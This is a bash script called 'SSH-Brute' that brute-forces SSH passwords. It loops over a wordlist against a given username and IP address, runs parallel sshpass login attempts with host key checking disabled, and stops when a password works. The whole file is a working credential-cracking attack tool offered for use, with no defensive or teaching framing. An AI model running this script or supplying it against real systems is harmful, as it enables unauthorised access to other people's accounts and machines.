#!/bin/bash

#Title
title=$(cat <<'EOF'

  _________ _________ ___ ___          __________                __          
 /   _____//   _____//   |   \         \______   \_______ __ ___/  |_  ____  
 \_____  \ \_____  \/    ~    \  ______ |    |  _/\_  __ \  |  \   __\/ __ \ 
 /        \/        \    Y    / /_____/ |    |   \ |  | \/  |  /|  | \  ___/ 
/_______  /_______  /\___|_  /          |______  / |__|  |____/ |__|  \___  >
        \/        \/       \/                  \/                         \/ 
version 1.1, made by bananut
EOF
)

# Check for help command
if [[ $1 == "-h" || $1 == "--help" ]]; then
  echo "Info: an ssh brute-forcing tool for cracking a users password"
  echo "Usage: $0 <username> <path/to/wordlist.txt> <ip_adress> <speed>"
  echo "     - speed changes the amount of login tries running at the same time"
  echo "     - if speed isn't set, defaults to 5"
  exit 1
fi


# Function to handle the interrupt signal (Ctrl+C)
cleanup() {
  echo "Script interrupted. Exiting..."
  exit 1
}

# Trap interrupt signal (Ctrl+C)
trap cleanup INT

# Get Arguments
user=$1
wordlist=$2
adress=$3
speed=$4

# Print the title
echo "$title"

# Ping to see if the adress is up
if ping -q -c 2 -W 1 "$adress" > /dev/null; then
  echo "Your adress is up"
else
  echo "Your adress is down"
  echo "Exiting ..."
  exit
fi

# Check for the wordlist
if [[ -z "$wordlist" ]]; then
  echo "Wordlist not found"
  exit
fi

# If speed isn't set, set to default
if [[ -z "$speed" ]]; then
  speed=5
fi

# Main loop
max_parallel="$speed"
{
  # Brute force password
  for passwd in $(cat "$wordlist");
  do
    (
      echo "Loging in into adress:$adress with password:$passwd as user:$user"
      if sshpass -p "$passwd" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -l "$user" "$adress" "exit" 2>/dev/null; then
        # Successful login
        echo "Success, Logged in using password:$passwd"
        kill 0
        exit 0
      fi

      wait

    ) &

    # Limit max number of parallel jobs
    if [[ $(jobs -r -p | wc -l) -ge $max_parallel ]]; then
      wait -n # Wait for a job to finish, to start a new one
    fi
  done

  wait
} 2>/dev/null

# End script if no password worked :(
echo "No password in wordlist matched"
